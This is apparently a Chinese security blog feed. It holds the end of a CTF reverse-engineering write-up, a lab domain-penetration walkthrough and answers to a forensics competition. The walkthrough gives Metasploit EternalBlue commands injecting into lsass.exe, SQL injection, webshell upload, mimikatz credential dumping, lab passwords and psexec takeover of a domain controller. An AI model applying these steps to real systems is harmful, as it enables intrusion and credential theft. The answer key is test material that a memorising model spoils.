incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qidong</span>(<span class="params"><span class="built_in">input</span>, key, IV</span>):</span><br><span class="line">    cipher = pyDes.des(key, pyDes.CBC, IV, pad = <span class="literal">None</span>, padmode = pyDes.PAD_PKCS5)</span><br><span class="line">    encrypted_data = cipher.encrypt(<span class="built_in">input</span>)</span><br><span class="line">    encrypted_hex_list = encrypted_data()</span><br><span class="line">    <span class="keyword">return</span> encrypted_hex_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    data = [</span><br><span class="line">        <span class="number">159</span>,</span><br><span class="line">        <span class="number">41</span>,</span><br><span class="line">        <span class="number">201</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">60</span>,</span><br><span class="line">        <span class="number">44</span>,</span><br><span class="line">        <span class="number">34</span>,</span><br><span class="line">        <span class="number">203</span>,</span><br><span class="line">        <span class="number">56</span>,</span><br><span class="line">        <span class="number">116</span>,</span><br><span class="line">        <span class="number">186</span>,</span><br><span class="line">        <span class="number">13</span>,</span><br><span class="line">        <span class="number">71</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">30</span>,</span><br><span class="line">        <span class="number">84</span>,</span><br><span class="line">        <span class="number">123</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">54</span>,</span><br><span class="line">        <span class="number">106</span>,</span><br><span class="line">        <span class="number">56</span>,</span><br><span class="line">        <span class="number">17</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">236</span>,</span><br><span class="line">        <span class="number">25</span>,</span><br><span class="line">        <span class="number">12</span>,</span><br><span class="line">        <span class="number">80</span>,</span><br><span class="line">        <span class="number">178</span>,</span><br><span class="line">        <span class="number">165</span>,</span><br><span class="line">        <span class="number">123</span>]</span><br><span class="line">    key = <span class="built_in">input</span>(<span class="string">&#x27;请输入key: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong key lenth!&#x27;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    flag = <span class="built_in">input</span>(<span class="string">&#x27;请输入flag: &#x27;</span>)</span><br><span class="line">    array = [</span><br><span class="line">        [</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">8</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">8</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">3</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">5</span>],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">4</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">2</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="number">5</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)],</span><br><span class="line">        [</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">1</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">3</span>,</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>),</span><br><span class="line">            <span class="number">0</span>]]</span><br><span class="line">    t = yuanshen(array, <span class="number">1</span>, <span class="number">8</span>)</span><br><span class="line">    IV = (<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line">)(t())</span><br><span class="line">    IV = adjust_length(IV)</span><br><span class="line">    check = qidong(flag, key, IV)</span><br><span class="line">    <span class="keyword">if</span> check == data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;yes,yes,yes!!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;bad,bad,bad!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>修改一下yuanshen函数的代码，就是求最短路径的算法，这里是用GPT生成的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">yuanshen</span>(<span class="params">array, start, end</span>):</span><br><span class="line">    num = <span class="built_in">len</span>(array)</span><br><span class="line">    dis = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * num</span><br><span class="line">    tree = [<span class="literal">False</span>] * num</span><br><span class="line">    parent = [-<span class="number">1</span>] * num</span><br><span class="line"></span><br><span class="line">    dis[start] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        min_dis = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">        min_index = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> tree[v] <span class="keyword">and</span> dis[v] &lt; min_dis:</span><br><span class="line">                min_dis = dis[v]</span><br><span class="line">                min_index = v</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> min_index == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        tree[min_index] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> tree[v] <span class="keyword">and</span> array[min_index][v] != <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">and</span> dis[min_index] + array[min_index][v] &lt; dis[v]:</span><br><span class="line">                dis[v] = dis[min_index] + array[min_index][v]</span><br><span class="line">                parent[v] = min_index</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> dis[end] == <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    t = []</span><br><span class="line">    current = end</span><br><span class="line">    <span class="keyword">while</span> current != -<span class="number">1</span>:</span><br><span class="line">        t.append(current)</span><br><span class="line">        current = parent[current]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> t[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>得到的值是15736428，最后DES解密即可。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231130183935416.png?imageSlim" alt="image-20231130183935416"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>DASCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>铁三域控</title>
    <url>/2023/11/25/Penetration/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>fscan探测主机。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121185345767.png"></p>
<span id="more"></span>

<h2 id="172-25-0-141"><a href="#172-25-0-141" class="headerlink" title="172.25.0.141"></a>172.25.0.141</h2><p>扫到存在永恒之蓝，用msf一把嗦，发现给了报错说是只支持64位的。。。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121185542503.png" alt="image-20231121185542503"></p>
<p>那么需要安装32位的框架和攻击脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span><br><span class="line">wine -h</span><br><span class="line"></span><br><span class="line">git clone https://gitcode.com/mirrors/1stPeak/Eternalblue-Doublepulsar-Metasploit-master.git</span><br><span class="line">cd Eternalblue-Doublepulsar-Metasploit/</span><br><span class="line">cp -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/eternalblue_doublepulsar</span><br><span class="line">set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</span><br><span class="line">set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</span><br><span class="line">set PROCESSINJECT lsass.exe</span><br><span class="line">set TARGETARCHITECTURE x86</span><br><span class="line"></span><br><span class="line">set rhosts 172.25.0.141</span><br><span class="line">set lhost 10.8.0.98</span><br></pre></td></tr></table></figure>

<p>能够成功拿到session，但似乎wine出了一点问题会断开连接。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125085917682.png" alt="image-20231125085917682"></p>
<h2 id="172-25-0-123"><a href="#172-25-0-123" class="headerlink" title="172.25.0.123"></a>172.25.0.123</h2><p>fscan扫出来应该是一个Web服务，打开来发现是织梦，用gobuster扫一下目录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u &quot;http://172.25.0.123/&quot; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -b 400-499</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121200417475.png" alt="image-20231121200417475"></p>
<p>官网上下了一套最新的dedecms的源码看一下，对比发现多出来一个&#x2F;sql，挺奇怪的。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121200510839.png" alt="image-20231121200510839"></p>
<p>尝试访问，发现像是一个sql查询的玩意儿，抓包分析一下，GET传参但是没有参数，尝试传入id会有没有什么改变。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121200817365.png" alt="image-20231121200817365"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121201123750.png" alt="image-20231121201123750"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121201156884.png" alt="image-20231121201156884"></p>
<p>传入不同的id发现页面不同，同时传入2’发现报错，那么大概率是可以sqlmap跑的。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121201434237.png" alt="image-20231121201434237"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121201514616.png" alt="image-20231121201514616"></p>
<p>找到flag表，成功拿到flag2。同时我们也可以找一找管理员的用户和密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121201657065.png" alt="image-20231121201657065"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121201811614.png" alt="image-20231121201811614"></p>
<p>解密得到admin的密码是1q2w3e4r，成功进入到后台&#x2F;dede，找到flag1。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121202059242.png" alt="image-20231121202059242"></p>
<p>在附件管理中存在一个文件式管理器的功能，可以写木马，同时可以找到flag文件。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121202507438.png" alt="image-20231121202507438"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121202856442.png" alt="image-20231121202856442"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121202528909.png" alt="image-20231121202528909"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231121202708843.png" alt="image-20231121202708843"></p>
<p>收集一下信息发现没有内网，罢了提个权叭。</p>
<p>尝试用suid提权，发现没有用，sudo提示报错需要一个终端去执行，网上搜了一下发现需要修改配置文件&#x2F;etc&#x2F;sudoers，注释掉 Default requiretty 一行，但是我都没提权连cat都看不了文件，就别提修改了。尝试直接登录root，毕竟之前还是爆出了一些密码，最终都失败了，提权到此为止。</p>
<h2 id="172-25-0-141-again"><a href="#172-25-0-141-again" class="headerlink" title="172.25.0.141 again"></a>172.25.0.141 again</h2><p>因为之前永恒之蓝没打通，再尝试尝试其他的入口，先扫一扫端口，发现开了远程桌面，而且记得在打Web服务器的时候有注出密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125090217186.png" alt="image-20231125090217186"></p>
<p>登录administrator，密码是topsec.123。开始收集信息，可以看到存在内网。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125090948565.png" alt="image-20231125090948565"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125091913905.png" alt="image-20231125091913905"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125093515722.png" alt="image-20231125093515722"></p>
<p>通过看arp表其实我们已经差不多可以找到域控了。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125091853762.png" alt="image-20231125091853762"></p>
<p>定位到了域控和TEST域。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125100415084.png" alt="image-20231125100415084"></p>
<p>成功抓到了TOPSEC域的管理员密码也就是上文我们Sql注入得到的密码。但是抓不到TEST域的密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125100748886.png" alt="image-20231125100748886"></p>
<p><strong>所以这里尝试上传mimikatz试试看能不能抓到，也抓不到。难崩应该是环境重置的问题。找了一个WP，看一下TEST域中administrator抓到的密码是TopSec_2017。</strong></p>
<h2 id="192-168-60-100"><a href="#192-168-60-100" class="headerlink" title="192.168.60.100"></a>192.168.60.100</h2><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125095917625.png" alt="image-20231125095917625"></p>
<p>发现也开了远程登录的端口，简单了，当然我这尝试了psexec也是可以成功拿到域控权限的。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231125102614810.png" alt="image-20231125102614810"></p>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
  </entry>
  <entry>
    <title>2023 美亚杯 资格赛</title>
    <url>/2023/11/18/Forensic/2023MeiyaIndividual/</url>
    <content><![CDATA[<h2 id="李大輝的安卓手机镜像-Android-bin"><a href="#李大輝的安卓手机镜像-Android-bin" class="headerlink" title="李大輝的安卓手机镜像 (Android.bin)"></a>李大輝的安卓手机镜像 (Android.bin)</h2><ol>
<li><p>参考’Android.bin’回答以下题目，李大辉所用手机移动运营商公司的名称。</p>
<p>DUCK</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231116201756409.png" alt="image-20231116201756409"></p>
</li>
<li><p>参考’Android.bin’回答以下题目，李大辉的手机安装了什么即时通讯软件</p>
<p>WhatsApp</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231116201946147.png" alt="image-20231116201946147"></p>
</li>
</ol>
<span id="more"></span>

<ol start="3">
<li><p>参考’Android.bin’回答以下题目李大辉的手机安装了什么反追踪软件？</p>
<p>photo_exif_editor_metadata</p>
<p>软件列表里没有找到可疑的，聊天记录里也没有翻到什么，最后在图片里找到了一张相关的截图。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231116203812142.png" alt="image-20231116203812142"></p>
</li>
<li><p>参考’Android.bin’回答以下题目，李大辉的手机是什么时间成功登入WhatsApp？</p>
<p>A. 2022-08-18_21:52:30</p>
<p>B. 2022-08-19_21:56:23</p>
<p>C. 2022-08-18_21:56:37</p>
<p>D. 2022-08-19_06:59:07</p>
<p>E. 2022-08-19_07:01:17</p>
<p>C</p>
<p>看登录时的短信验证码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231116204159042.png" alt="image-20231116204159042"></p>
</li>
<li><p>参考’Android.bin’回答以下题目，李大辉登入WHATSAPP时的认证短码是什么？</p>
<p>304313</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231116203850496.png" alt="image-20231116203850496"></p>
</li>
<li><p>参考’Android.bin’回答以下题目，李大辉到美丽好化妆品公司的入职时间是何时？</p>
<p>2017-05-25</p>
<p>记得去年考过是在一个 pdf 里面。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231116204019400.png" alt="image-20231116204019400"></p>
</li>
<li><p>参考’Android.bin’回答以下题目，李大辉曾于什么时间使用了图像编辑软件？</p>
<p>A. 2022-09-10</p>
<p>B. 2022-09-12</p>
<p>C. 2022-10-05</p>
<p>D. 2022-11-10</p>
<p>E. 2022-11-13</p>
<p>D</p>
<p>盘古石里面有应用使用时间的记录，找到最可疑是图片修改软件的。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231116204429409.png" alt="image-20231116204429409"></p>
</li>
</ol>
<h2 id="浩賢的个人虚拟机文件-Server-zip"><a href="#浩賢的个人虚拟机文件-Server-zip" class="headerlink" title="浩賢的个人虚拟机文件(Server.zip)"></a>浩賢的个人虚拟机文件(Server.zip)</h2><ol start="8">
<li><p>参考Server文件夹下的’Meiya_VPN.vmdk’回答以下题目，这个访问服务器使用了哪个端口？</p>
<p>943</p>
<p>直接找浏览器的记录。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231116204626457.png" alt="image-20231116204626457"></p>
</li>
<li><p>参考Server文件夹下的’Meiya_VPN.vmdk’回答以下题目，“User1”账户最近连接到这个访问服务器时使用的IP地址是多少？</p>
<p>192.166.244.167</p>
<p>火眼里看一看有没有登录的日志没找到User1用户，猜测应该是在 OpenVPN 的日志文件里。</p>
<p>OpenVPN的日志可能被重定向到系统日志，通常在<code>/var/log/syslog</code>或<code>/var/log/messages</code>文件中。如果在OpenVPN配置文件中明确指定了日志文件路径，也可能在<code>/var/log/openvpn.log</code>中。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117083238964.png" alt="image-20231117083238964"></p>
</li>
<li><p>[多选题]参考Server文件夹下的’Meiya_VPN.vmdk’回答以下题目，哪些文件可以找出这个访问服务器的Ubuntu版本？&#96;</p>
<p>A. lsb-release</p>
<p>B. issue.net</p>
<p>C. .profile</p>
<p>D. console</p>
<p>AB</p>
<p>lsb-release是常见选项了，主要是后面的选项，find 找一下文件然后看一下就好。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117084902921.png" alt="image-20231117084902921"></p>
</li>
<li><p>[多选题]参考Server文件夹下的’Meiya_VPN.vmdk’回答以下题目，哪些文件有助于分辨这是一个存储服务器？</p>
<p>A. auth.log</p>
<p>B. sys.log</p>
<p>C. bash_history</p>
<p>D. idconfig</p>
<p>ABC</p>
<p><strong>auth.log</strong>：这是Linux系统上用于记录身份验证信息的日志文件。通常，包括用户登录、su（切换用户）以及其他身份验证相关的信息。在Ubuntu和Debian等系统上，通常位于<code>/var/log/auth.log</code>。</p>
<p><strong>syslog</strong>：这是系统日志文件，记录了系统的各种事件、错误和信息。在不同的Linux发行版中，它的位置可能不同，例如在Ubuntu和Debian系统上通常是<code>/var/log/syslog</code>。</p>
<p> <strong>bash_history</strong>：这是用户的bash shell命令历史记录文件，记录了用户在命令行中输入的命令。每个用户都有一个<code>.bash_history</code>文件，通常位于用户的家目录中（<code>~/.bash_history</code>）。</p>
<p><strong>ldconfig</strong>：这是一个用于配置动态链接库运行时链接器的命令。它不是一个文件，而是一个命令。当你执行<code>ldconfig</code>命令时，它会更新系统的共享库缓存，以便新安装的共享库能够被找到。</p>
</li>
<li><p>参考Server文件夹下的’Meiya_VPN.vmdk’回答以下题目这个访问服务器所在时区是哪个时区？</p>
<p>A. UTC +9</p>
<p>B. UTC +8</p>
<p>C. UTC -7</p>
<p>D. UTC</p>
<p>C</p>
<p>找出来是-0800，没这个答案就选个最近的，也不知道是不是我理解有误。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117085801491.png" alt="image-20231117085801491"></p>
</li>
<li><p>参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘ 回答以下题目，这个访问服务器的“openvpn”帐户密码是多少？</p>
<p>TLfAg6l6dssc</p>
<p>火狐上有两个密码猜测是内网地址的密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117090039734.png" alt="image-20231117090039734"></p>
<p>在<code>/usr/local/openvpn_as</code>目录找到 init.log ，为openvpn的初始化日志，里面含有密码。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117090221857.png" alt="image-20231117090221857"></p>
</li>
<li><p>参考Server文件夹下的 ‘ Meiya_VPN.vmdk ‘回答以下题目，在这个访问服务器中，“User1”账户之间的连接所使用的加密算法（密码）是什么？</p>
<p>A. Blowfish-CBC</p>
<p>B. 3DES-CBC</p>
<p>C. AES-128-GCM</p>
<p>D. AES-256-CBC</p>
<p>D</p>
<p>日志文件里就能找到。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117092925578.png" alt="image-20231117092925578"></p>
</li>
</ol>
<h2 id="Elvis-Chui计算机的一个网络封包文件-網路-pcapng"><a href="#Elvis-Chui计算机的一个网络封包文件-網路-pcapng" class="headerlink" title="Elvis Chui计算机的一个网络封包文件(網路.pcapng)"></a>Elvis Chui计算机的一个网络封包文件(網路.pcapng)</h2><ol start="15">
<li><p>参考’ 网络题目.pcapng ‘ 文件回答以下题目，给出正在进行Nmap扫描的计算机互联网协议地址？</p>
<p>192.168.186.132</p>
<p>可以看到大量的 TCP 访问端口的记录。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117093414000.png" alt="image-20231117093414000"></p>
</li>
<li><p>参考’网络题目.pcapng’文件回答以下题目，有多少个Nmap扫描正在同时进行？</p>
<p>2</p>
<p>按时间排序可以看到在 TCP 扫描的同时还夹杂着 UDP 的扫描。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117094230253.png" alt="image-20231117094230253"></p>
</li>
<li><p>参考’网络题目.pcapng’文件回答以下题目，当计算机正在扫瞄8.8.8.8，namp相关的指令是什么？</p>
<p>A. nmap -sT 8.8.8.8</p>
<p>B. nmap -sU 8.8.8.8</p>
<p>C. nmap -sn -PR 8.8.8.8</p>
<p>D. nmap -sn -PU 8.8.8.8</p>
<p>A</p>
<p>根据上述得知扫描 8.8.8.8 是用的 TCP 扫描。</p>
</li>
<li><p>参考’网络题目.pcapng’文件回答以下题目，当计算机正在扫瞄45.33.32.156，namp相关的指令是什么？</p>
<p>A. nmap -sT 45.33.32.156</p>
<p>B. nmap -sU 45.33.32.156</p>
<p>C. nmap -sn -45.33.32.156</p>
<p>D. nmap -sn -45.33.32.156</p>
<p>B</p>
<p>根据上述得知扫描 45.33.32.156 是用的 UDP 扫描。</p>
</li>
</ol>
<h2 id="李大輝的MacOS系统镜像-Mac-OS-img"><a href="#李大輝的MacOS系统镜像-Mac-OS-img" class="headerlink" title="李大輝的MacOS系统镜像(Mac OS.img)"></a>李大輝的MacOS系统镜像(Mac OS.img)</h2><ol start="26">
<li><p>参考’Mac OS.img’文件回答以下题目，’Mac OS.img’文件中可以找到多少个符号链接？</p>
<p>1</p>
<p>放到火眼和取证大师都没分析出来，不是系统盘的磁盘镜像，是一个USB镜像，直接看文件。</p>
<p>在 macOS 中，符号链接（Symbolic Links，也称为软链接）是一种特殊类型的文件，它创建了一个指向另一个文件或目录的链接。简单来说就是快捷方式。在 macOS 中，Alias（别名）文件通常没有特定的文件扩展名。Alias 文件是一种特殊类型的文件，用于创建指向其他文件或目录的快捷方式。与符号链接（Symbolic Links）类似，Alias 文件的标识不依赖于文件名的扩展名。有时人们可能会使用 <code>.alias</code> 或 <code>.symlink</code> 之类的后缀来命名 Alias 文件，但这只是一种个人或组织的命名约定，不是系统要求的。 </p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117095728652.png" alt="image-20231117095728652"></p>
</li>
<li><p>参考’Mac OS.img’文件回答以下题目，在’Mac OS.img’档中使用了哪种分区方案？</p>
<p>A. Apple Partition Map</p>
<p>B. GUID Partition Table</p>
<p>C. Master Boot Record</p>
<p>D. HFS+</p>
<p>B</p>
<p>Winhex可以看到，GPT 分区就是 GUID。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231117100044189.png" alt="image-20231117100044189"></p>
</li>
